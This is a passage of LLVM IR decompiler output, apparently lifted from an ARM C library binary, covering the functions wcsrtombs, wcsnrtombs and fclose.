  br i1 %v2_1b180, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_1b188 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_1b1b0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_1b19c = phi i32 [ %arg1, %.thread ], [ %v3_1b188, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_1b198 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1b198, i32* @ip, align 4
  %v2_1b1a0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_1b198, i32* %stack_var_-16, align 4
  store i32 %v0_1b1b0, i32* %stack_var_-12, align 4
  %v5_1b1b8 = inttoptr i32 %v0_1b19c to i8*
  %v6_1b1b8 = call i32 @__GI_wcsnrtombs(i8* %v5_1b1b8, i32 %v2_1b1a0, i32 1, i32 16, i32 %arg3)
  %v2_1b1bc = icmp eq i32 %v6_1b1b8, 0
  br i1 %v2_1b1bc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_1b1cc = phi i32 [ %v6_1b1b8, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_1b17c, i32* @lr, align 4
  ret i32 %v1_1b1cc

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1b1e4 = load i32, i32* @r0, align 4
  %v1_1b1e4 = load i32, i32* @r1, align 4
  %v5_1b1e4 = inttoptr i32 %v0_1b1e4 to i8*
  %v6_1b1e4 = call i32 @__GI_wcsnrtombs(i8* %v5_1b1e4, i32 %v1_1b1e4, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_1b1e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b1f4 = load i32, i32* @r4, align 4
  store i32 %v3_1b1f4, i32* %stack_var_-12, align 4
  %v10_1b1f8 = icmp eq i32 %tmp, %arg2
  store i1 %v10_1b1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_1b1f8, label %dec_label_pc_1b210, label %bb

bb:                                               ; preds = %entry
  %v4_1b1fc = icmp eq i8* %arg1, null
  store i1 %v4_1b1fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_1b1fc, label %dec_label_pc_1b210.thread, label %bb39

dec_label_pc_1b210.thread:                        ; preds = %bb
  %v2_1b200 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_1b210:                               ; preds = %entry
  %v2_1b2001 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_1b210 = icmp eq i8* %arg1, null
  store i1 %v3_1b210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b210, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1b210
  store i32 %v2_1b2001, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_1b210, %dec_label_pc_1b210.thread
  %storemerge20 = phi i32 [ %v2_1b2001, %dec_label_pc_1b210 ], [ %v2_1b200, %dec_label_pc_1b210.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1b27428 = phi i32 [ %v2_1b2001, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_1b228 = load i32, i32* @r3, align 4
  %v3_1b228 = icmp uge i32 %v0_1b228, %arg3
  %arg3.v0_1b228 = select i1 %v3_1b228, i32 %arg3, i32 %v0_1b228
  store i32 %arg3.v0_1b228, i32* %r5.global-to-local, align 4
  %v1_1b234 = inttoptr i32 %arg2 to i32*
  %v2_1b234 = load i32, i32* %v1_1b234, align 4
  store i32 %v2_1b234, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_1b228, i32* %r0.global-to-local, align 4
  %v2_1b28822 = icmp eq i32 %arg3.v0_1b228, 0
  store i1 %v2_1b28822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b28822, label %dec_label_pc_1b290, label %dec_label_pc_1b240

dec_label_pc_1b240:                               ; preds = %.thread14.thread, %dec_label_pc_1b280.dec_label_pc_1b240_crit_edge
  %v2_1b274 = phi i32 [ %v2_1b280, %dec_label_pc_1b280.dec_label_pc_1b240_crit_edge ], [ %v2_1b27428, %.thread14.thread ]
  %v0_1b24c = phi i32 [ %v0_1b240.pre, %dec_label_pc_1b280.dec_label_pc_1b240_crit_edge ], [ %v2_1b234, %.thread14.thread ]
  %v1_1b240 = inttoptr i32 %v0_1b24c to i32*
  %v2_1b240 = load i32, i32* %v1_1b240, align 4
  %v7_1b244 = icmp eq i32 %v2_1b240, 127
  store i1 %v7_1b244, i1* %cpsr_z.global-to-local, align 1
  %v1_1b248 = urem i32 %v2_1b240, 256
  store i32 %v1_1b248, i32* @ip, align 4
  %v1_1b24c = add i32 %v0_1b24c, 4
  store i32 %v1_1b24c, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_1b240, 128
  br i1 %tmp45, label %dec_label_pc_1b270, label %dec_label_pc_1b254

dec_label_pc_1b254:                               ; preds = %dec_label_pc_1b240
  store i32 93732, i32* %r2.global-to-local, align 4
  %v0_1b258 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b258, i32* %r0.global-to-local, align 4
  %v3_1b25c = load i16, i16* @global_var_32088.1320, align 2
  %v4_1b25c = sext i16 %v3_1b25c to i32
  store i32 %v4_1b25c, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1b268 = add i32 %v4_1b25c, %v0_1b258
  %v4_1b268 = inttoptr i32 %v3_1b268 to i32*
  store i32 84, i32* %v4_1b268, align 4
  %v0_1b29c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b29c

dec_label_pc_1b270:                               ; preds = %dec_label_pc_1b240
  %v2_1b270 = icmp eq i32 %v1_1b248, 0
  store i1 %v2_1b270, i1* %cpsr_z.global-to-local, align 1
  %v1_1b274 = trunc i32 %v2_1b240 to i8
  %v3_1b274 = inttoptr i32 %v2_1b274 to i8*
  store i8 %v1_1b274, i8* %v3_1b274, align 1
  %v0_1b278 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b278, label %.dec_label_pc_1b290_crit_edge, label %dec_label_pc_1b280

dec_label_pc_1b280:                               ; preds = %dec_label_pc_1b270
  %v0_1b280 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b280 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b280 = add i32 %v1_1b280, %v0_1b280
  store i32 %v2_1b280, i32* %lr.global-to-local, align 4
  %v0_1b284 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b284 = add i32 %v0_1b284, -1
  store i32 %v1_1b284, i32* %r0.global-to-local, align 4
  %v2_1b288 = icmp eq i32 %v1_1b284, 0
  store i1 %v2_1b288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b288, label %dec_label_pc_1b290, label %dec_label_pc_1b280.dec_label_pc_1b240_crit_edge

dec_label_pc_1b280.dec_label_pc_1b240_crit_edge:  ; preds = %dec_label_pc_1b280
  %v0_1b240.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b240

.dec_label_pc_1b290_crit_edge:                    ; preds = %dec_label_pc_1b270
  %v1_1b278 = load i32, i32* @ip, align 4
  store i32 %v1_1b278, i32* %r2.global-to-local, align 4
  %v0_1b290.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1b290

dec_label_pc_1b290:                               ; preds = %dec_label_pc_1b280, %.dec_label_pc_1b290_crit_edge, %.thread14.thread
  %v0_1b290 = phi i32 [ %v0_1b290.pre, %.dec_label_pc_1b290_crit_edge ], [ %v2_1b27428, %.thread14.thread ], [ %v2_1b280, %dec_label_pc_1b280 ]
  %v1_1b290 = load i32, i32* @sp, align 4
  %v9_1b290 = icmp eq i32 %v0_1b290, %v1_1b290
  store i1 %v9_1b290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b290, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1b290
  %v1_1b294 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1b294, i32* %v1_1b234, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1b290, %bb43
  %v0_1b298 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b298 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b298 = sub i32 %v1_1b298, %v0_1b298
  store i32 %v2_1b298, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b29c

dec_label_pc_1b29c:                               ; preds = %dec_label_pc_1b254, %bb44
  %v0_1b29c = phi i32 [ %v0_1b29c.pre, %dec_label_pc_1b254 ], [ %v2_1b298, %bb44 ]
  store i32 %v0_1b29c, i32* %r0.global-to-local, align 4
  %v2_1b2a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b2a4, i32* %r4.global-to-local, align 4
  ret i32 %v0_1b29c

; uselistorder directives
  uselistorder i32 %v0_1b29c, { 1, 0 }
  uselistorder i32 %v1_1b284, { 1, 0 }
  uselistorder i32 %v2_1b280, { 0, 2, 1 }
  uselistorder i32 %v1_1b248, { 1, 0 }
  uselistorder i32 %v2_1b240, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1b27428, { 1, 0 }
  uselistorder i32 %v2_1b2001, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 4, 2, 3, 5, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 5, 2, 4, 1, 3, 0, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 6, 3, 4, 5, 1, 7, 0, 8, 9 }
  uselistorder i32 127, { 4, 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b29c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1b290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b240, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1b2b0 = load i32, i32* @r4, align 4
  store i32 %v3_1b2b0, i32* %stack_var_-36, align 4
  %v6_1b2b0 = load i32, i32* @r5, align 4
  %v9_1b2b0 = load i32, i32* @r6, align 4
  %v12_1b2b0 = load i32, i32* @r7, align 4
  %v15_1b2b0 = load i32, i32* @r8, align 4
  %v27_1b2b0 = load i32, i32* @lr, align 4
  %v2_1b2b4 = add i32 %tmp, 52
  %v3_1b2b4 = inttoptr i32 %v2_1b2b4 to i32*
  %v4_1b2b4 = load i32, i32* %v3_1b2b4, align 4
  store i32 %v4_1b2b4, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b2bc = icmp eq i32 %v4_1b2b4, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* @r8, align 4
  br i1 %v2_1b2bc, label %dec_label_pc_1b2d0, label %dec_label_pc_1b334

dec_label_pc_1b2d0:                               ; preds = %entry
  %v0_1b2d0 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b2d0, i32* %r0.global-to-local, align 4
  %v0_1b2d4 = load i32, i32* @r5, align 4
  %v1_1b2d4 = add i32 %v0_1b2d4, 64
  %v2_1b2d4 = inttoptr i32 %v1_1b2d4 to i32*
  %v3_1b2d4 = load i32, i32* %v2_1b2d4, align 4
  store i32 %v3_1b2d4, i32* %r3.global-to-local, align 4
  %v1_1b2d8 = add i32 %v0_1b2d0, -1168
  store i32 %v1_1b2d8, i32* @r6, align 4
  %v3_1b2dc = icmp uge i32 %v3_1b2d4, %v1_1b2d8
  store i1 %v3_1b2dc, i1* %cpsr_c.global-to-local, align 1
  %v9_1b2dc = icmp eq i32 %v3_1b2d4, %v1_1b2d8
  br i1 %v9_1b2dc, label %dec_label_pc_1b328, label %dec_label_pc_1b2e4

dec_label_pc_1b2e4:                               ; preds = %dec_label_pc_1b2d0
  %v1_1b2e4 = add i32 %v0_1b2d4, 56
  store i32 %v1_1b2e4, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_1b2e4, i32* %r2.global-to-local, align 4
  %v0_1b2f0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1b2f0, i32* @r4, align 4
  %v1_1b2f4115 = inttoptr i32 %v1_1b2e4 to i32*
  %v2_1b2f4116 = load i32, i32* %v1_1b2f4115, align 4
  store i32 %v2_1b2f4116, i32* %r3.global-to-local, align 4
  %v3_1b2f8118 = icmp uge i32 %v2_1b2f4116, %v0_1b2f0
  store i1 %v3_1b2f8118, i1* %cpsr_c.global-to-local, align 1
  %v9_1b2f8124 = icmp eq i32 %v2_1b2f4116, %v0_1b2f0
  br i1 %v9_1b2f8124, label %dec_label_pc_1b300, label %dec_label_pc_1b318

dec_label_pc_1b300:                               ; preds = %dec_label_pc_1b2e4, %dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge
  %v0_1b300125 = phi i32 [ %v1_1b2f8.pre, %dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge ], [ %v0_1b2f0, %dec_label_pc_1b2e4 ]
  store i32 %v0_1b300125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b310 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b310, label %dec_label_pc_1b314, label %dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge

dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge:  ; preds = %dec_label_pc_1b300
  %v0_1b2f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b2f8.pre = load i32, i32* @r4, align 4
  %v1_1b2f4 = inttoptr i32 %v0_1b2f4.pre to i32*
  %v2_1b2f4 = load i32, i32* %v1_1b2f4, align 4
  store i32 %v2_1b2f4, i32* %r3.global-to-local, align 4
  %v3_1b2f8 = icmp uge i32 %v2_1b2f4, %v1_1b2f8.pre
  store i1 %v3_1b2f8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b2f8 = icmp eq i32 %v2_1b2f4, %v1_1b2f8.pre
  br i1 %v9_1b2f8, label %dec_label_pc_1b300, label %dec_label_pc_1b318

dec_label_pc_1b314:                               ; preds = %dec_label_pc_1b300
  %v0_1b314 = load i32, i32* @r4, align 4
  store i32 %v0_1b314, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b318

dec_label_pc_1b318:                               ; preds = %dec_label_pc_1b2e4, %dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge, %dec_label_pc_1b314
  %v0_1b318 = phi i32 [ %v0_1b314, %dec_label_pc_1b314 ], [ %v2_1b2f4116, %dec_label_pc_1b2e4 ], [ %v2_1b2f4, %dec_label_pc_1b300.dec_label_pc_1b2f4_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b318 = icmp eq i32 %v0_1b318, 0
  br i1 %v2_1b318, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1b318
  %v1_1b31c = load i32, i32* @r7, align 4
  store i32 %v1_1b31c, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1b318, %bb
  %v1_1b320 = xor i1 %v2_1b318, true
  call void @__pseudo_cond_branch(i1 %v1_1b320, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1b324 = load i32, i32* @r6, align 4
  %v1_1b324 = load i32, i32* @r5, align 4
  %v2_1b324 = add i32 %v1_1b324, 64
  %v3_1b324 = inttoptr i32 %v2_1b324 to i32*
  store i32 %v0_1b324, i32* %v3_1b324, align 4
  %v0_1b328.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b328

dec_label_pc_1b328:                               ; preds = %dec_label_pc_1b2d0, %bb41
  %v0_1b328 = phi i32 [ %v0_1b2d4, %dec_label_pc_1b2d0 ], [ %v0_1b328.pre, %bb41 ]
  %v1_1b328 = add i32 %v0_1b328, 60
  %v2_1b328 = inttoptr i32 %v1_1b328 to i32*
  %v3_1b328 = load i32, i32* %v2_1b328, align 4
  %v1_1b32c = add i32 %v3_1b328, 1
  store i32 %v1_1b32c, i32* %r3.global-to-local, align 4
  store i32 %v1_1b32c, i32* %v2_1b328, align 4
  %v0_1b334.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1b334

dec_label_pc_1b334:                               ; preds = %entry, %dec_label_pc_1b328
  %v1_1b33c = phi i32 [ %tmp, %entry ], [ %v0_1b334.pre, %dec_label_pc_1b328 ]
  %v1_1b334 = inttoptr i32 %v1_1b33c to i16*
  %v2_1b334 = load i16, i16* %v1_1b334, align 2
  %v3_1b334 = zext i16 %v2_1b334 to i32
  store i32 %v3_1b334, i32* %r3.global-to-local, align 4
  %v1_1b338 = and i32 %v3_1b334, 64
  %v2_1b338 = icmp eq i32 %v1_1b338, 0
  br i1 %v2_1b338, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_1b334
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1b334, %bb42
  %storemerge = phi i32 [ %v1_1b33c, %bb42 ], [ %v1_1b338, %dec_label_pc_1b334 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 111428, i32* @lr, align 4
  %v1_1b340 = xor i1 %v2_1b338, true
  call void @__pseudo_cond_branch(i1 %v1_1b340, i32 ptrtoint (i32* @global_var_1cc88.1700 to i32))
  %v0_1b344 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b344, i32* %fp.global-to-local, align 4
  %v0_1b348 = load i32, i32* @r5, align 4
  %v1_1b348 = add i32 %v0_1b348, 4
  %v2_1b348 = inttoptr i32 %v1_1b348 to i32*
  %v3_1b348 = load i32, i32* %v2_1b348, align 4
  store i32 %v3_1b348, i32* %r0.global-to-local, align 4
  %v1_1b34c = call i32 @__GI___libc_close(i32 %v3_1b348)
  store i32 %v1_1b34c, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1b354 = load i32, i32* @r8, align 4
  %v2_1b354 = add i32 %v0_1b354, 176
  %v3_1b354 = inttoptr i32 %v2_1b354 to i32*
  %v4_1b354 = load i32, i32* %v3_1b354, align 4
  store i32 %v4_1b354, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1b358 = icmp slt i32 %v1_1b34c, 0
  br i1 %v1_1b358, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_1b360 = add i32 %v4_1b354, 8
  %v2_1b360 = inttoptr i32 %v1_1b360 to i32*
  %v3_1b360 = load i32, i32* %v2_1b360, align 4
  store i32 %v3_1b360, i32* %r3.global-to-local, align 4
  %v0_1b364 = call i32 @__aeabi_read_tp()
  store i32 %v0_1b364, i32* %r0.global-to-local, align 4
  %v1_1b368 = add i32 %v0_1b364, -1168
  store i32 %v1_1b368, i32* %sl.global-to-local, align 4
  %v0_1b36c = load i32, i32* %r3.global-to-local, align 4
  %v3_1b36c = icmp uge i32 %v0_1b36c, %v1_1b368
  store i1 %v3_1b36c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b36c = icmp eq i32 %v0_1b36c, %v1_1b368
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1b374 = load i32, i32* @r5, align 4
  %v2_1b374 = add i32 %v1_1b374, 4
  %v3_1b374 = inttoptr i32 %v2_1b374 to i32*
  store i32 -1, i32* %v3_1b374, align 4
  br i1 %v9_1b36c, label %dec_label_pc_1b3bc, label %dec_label_pc_1b37c

dec_label_pc_1b37c:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1b380 = load i32, i32* @r7, align 4
  store i32 %v0_1b380, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1b388108 = inttoptr i32 %v0_1b380 to i32*
  %v2_1b388109 = load i32, i32* %v1_1b388108, align 4
  store i32 %v2_1b388109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1b38c111 = icmp eq i32 %v2_1b388109, 0
  br i1 %v9_1b38c111, label %dec_label_pc_1b394, label %dec_label_pc_1b3ac

dec_label_pc_1b394:                               ; preds = %dec_label_pc_1b37c, %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge
  %v0_1b394112 = phi i32 [ %v1_1b38c.pre, %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge ], [ 0, %dec_label_pc_1b37c ]
  store i32 %v0_1b394112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b3a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1b3a4, label %dec_label_pc_1b3a8, label %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge

dec_label_pc_1b394.dec_label_pc_1b388_crit_edge:  ; preds = %dec_label_pc_1b394
  %v0_1b388.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1b38c.pre = load i32, i32* @r4, align 4
  %v1_1b388 = inttoptr i32 %v0_1b388.pre to i32*
  %v2_1b388 = load i32, i32* %v1_1b388, align 4
  store i32 %v2_1b388, i32* %r3.global-to-local, align 4
  %v3_1b38c = icmp uge i32 %v2_1b388, %v1_1b38c.pre
  store i1 %v3_1b38c, i1* %cpsr_c.global-to-local, align 1
  %v9_1b38c = icmp eq i32 %v2_1b388, %v1_1b38c.pre
  br i1 %v9_1b38c, label %dec_label_pc_1b394, label %dec_label_pc_1b3ac

dec_label_pc_1b3a8:                               ; preds = %dec_label_pc_1b394
  %v0_1b3a8 = load i32, i32* @r4, align 4
  store i32 %v0_1b3a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b3ac

dec_label_pc_1b3ac:                               ; preds = %dec_label_pc_1b37c, %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge, %dec_label_pc_1b3a8
  %v0_1b3ac = phi i32 [ %v0_1b3a8, %dec_label_pc_1b3a8 ], [ %v2_1b388109, %dec_label_pc_1b37c ], [ %v2_1b388, %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge ]
  %v1_1b3ac = phi i32 [ %v0_1b3a8, %dec_label_pc_1b3a8 ], [ 0, %dec_label_pc_1b37c ], [ %v1_1b38c.pre, %dec_label_pc_1b394.dec_label_pc_1b388_crit_edge ]
  %v3_1b3ac = icmp uge i32 %v0_1b3ac, %v1_1b3ac
  store i1 %v3_1b3ac, i1* %cpsr_c.global-to-local, align 1
  %v9_1b3ac = icmp eq i32 %v0_1b3ac, %v1_1b3ac
  br i1 %v9_1b3ac, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_1b3ac
  %v1_1b3b0 = load i32, i32* @r7, align 4
  store i32 %v1_1b3b0, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1b3ac, %bb46
  %v1_1b3b4 = xor i1 %v9_1b3ac, true
  call void @__pseudo_cond_branch(i1 %v1_1b3b4, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1b3b8 = load i32, i32* %sl.global-to-local, align 4
  %v1_1b3b8 = load i32, i32* @r7, align 4
  %v2_1b3b8 = add i32 %v1_1b3b8, 8
  %v3_1b3b8 = inttoptr i32 %v2_1b3b8 to i32*
  store i32 %v0_1b3b8, i32* %v3_1b3b8, align 4
  br label %dec_label_pc_1b3bc

dec_label_pc_1b3bc:                               ; preds = %bb45, %bb47
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_1b3c0 = load i32, i32* @r8, align 4
  %v2_1b3c0 = add i32 %v0_1b3c0, 176
  %v3_1b3c0 = inttoptr i32 %v2_1b3c0 to i32*
  %v4_1b3c0 = load i32, i32* %v3_1b3c0, align 4
  store i32 %v4_1b3c0, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1b3c8 = add i32 %v0_1b3c0, 12
  %v3_1b3c8 = inttoptr i32 %v2_1b3c8 to i32*
  %v4_1b3c8 = load i32, i32* %v3_1b3c8, align 4
  store i32 %v4_1b3c8, i32* %r2.global-to-local, align 4
  %v1_1b3cc = add i32 %v4_1b3c0, 4
  %v2_1b3cc = inttoptr i32 %v1_1b3cc to i32*
  %v3_1b3cc = load i32, i32* %v2_1b3cc, align 4
  store i32 %v3_1b3cc, i32* %r1.global-to-local, align 4
  %v1_1b3d0 = inttoptr i32 %v4_1b3c8 to i32*
  %v2_1b3d0 = load i32, i32* %v1_1b3d0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b3d4 = icmp eq i32 %v3_1b3cc, 0
  %v1_1b3d8 = add i32 %v2_1b3d0, 1
  store i32 %v1_1b3d8, i32* %r3.global-to-local, align 4
  store i32 %v1_1b3d8, i32* %v1_1b3d0, align 4
  br i1 %v2_1b3d4, label %dec_label_pc_1b3e4, label %dec_label_pc_1b444

dec_label_pc_1b3e4:                               ; preds = %dec_label_pc_1b3bc
  %v0_1b3e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b3e4 = add i32 %v1_1b3e4, 8
  %v3_1b3e4 = inttoptr i32 %v2_1b3e4 to i32*
  store i32 %v0_1b3e4, i32* %v3_1b3e4, align 4
  %v0_1b3e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b3e8, i32* @r7, align 4
  br label %dec_label_pc_1b3ec

dec_label_pc_1b3ec:                               ; preds = %dec_label_pc_1b41c.dec_label_pc_1b3ec_crit_edge, %dec_label_pc_1b3e4
  %v0_1b3ec = phi i32 [ %v0_1b3ec.pre, %dec_label_pc_1b41c.dec_label_pc_1b3ec_crit_edge ], [ %v0_1b3e8, %dec_label_pc_1b3e4 ]
  %v1_1b3ec = inttoptr i32 %v0_1b3ec to i32*
  %v2_1b3ec = load i32, i32* %v1_1b3ec, align 4
  store i32 %v2_1b3ec, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1b3ec, i32* %r2.global-to-local, align 4
  %v2_1b3f896 = load i32, i32* %v1_1b3ec, align 4
  store i32 %v2_1b3f896, i32* %r3.global-to-local, align 4
  %v3_1b3fc98 = icmp uge i32 %v2_1b3f896, %v2_1b3ec
  store i1 %v3_1b3fc98, i1* %cpsr_c.global-to-local, align 1
  %v9_1b3fc104 = icmp eq i32 %v2_1b3f896, %v2_1b3ec
  br i1 %v9_1b3fc104, label %dec_label_pc_1b404, label %dec_label_pc_1b41c

dec_label_pc_1b404:                               ; preds = %dec_label_pc_1b3ec, %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge
  %v0_1b404105 = phi i32 [ %v1_1b3fc.pre, %dec_label_pc_1b404.dec_label_pc_1b3f8_crit_edge ], [ %v2_1b3ec, %dec_label_pc_1b3ec ]
  store i32 %v0_1b404105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1b414 = load i1, i1* %cpsr_c.global-to-local, align 1
